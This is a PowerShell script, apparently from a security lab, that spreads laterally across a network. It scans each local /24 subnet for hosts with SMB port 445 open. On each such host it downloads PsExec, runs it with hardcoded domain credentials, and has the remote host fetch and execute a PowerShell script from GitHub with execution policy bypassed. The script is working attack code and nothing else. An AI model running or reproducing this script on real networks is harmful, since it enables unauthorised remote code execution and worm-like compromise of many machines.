function Test-Port {
    param (
        [string]$IP,
        [int]$Port,
        [int]$Timeout = 300
    )

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($IP, $Port, $null, $null)
        $success = $iar.AsyncWaitHandle.WaitOne($Timeout, $false)
        $client.Close()
        return $success
    } catch {
        return $false
    }
}

$ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -ExpandProperty IPAddress
foreach ($ip in $ipAddresses) {

    $octets = $ip.Split('.')
    $subnetPrefix = "{0}.{1}.{2}" -f $octets[0], $octets[1], $octets[2]
    $attempted = @{}
    for ($counter = 1; ($octets[3] - $counter) -ge 1; $counter++) {
        $lastOctet = $octets[3] - $counter
        $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet

        if ($attempted.ContainsKey($targetIP)) { continue }
        $attempted[$targetIP] = $true

        $smb = Test-Port -IP $targetIP -Port 445

        if ($smb) {
            
            Write-Host "Attempting SMB remoting to $targetIP"

            iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe
            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -b -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
            del test.exe
    	}
    }

    for ($counter = 1; ([int]$octets[3] + $counter) -le 254; $counter++) {
        $lastOctet = [int]$octets[3] + $counter
        $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet

        if ($attempted.ContainsKey($targetIP)) { continue }
        $attempted[$targetIP] = $true

        $smb = Test-Port -IP $targetIP -Port 445

        if ($smb) {
            
            Write-Host "Attempting SMB remoting to $targetIP"

            iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe
            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -b -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
            del test.exe
    	}
	}
}
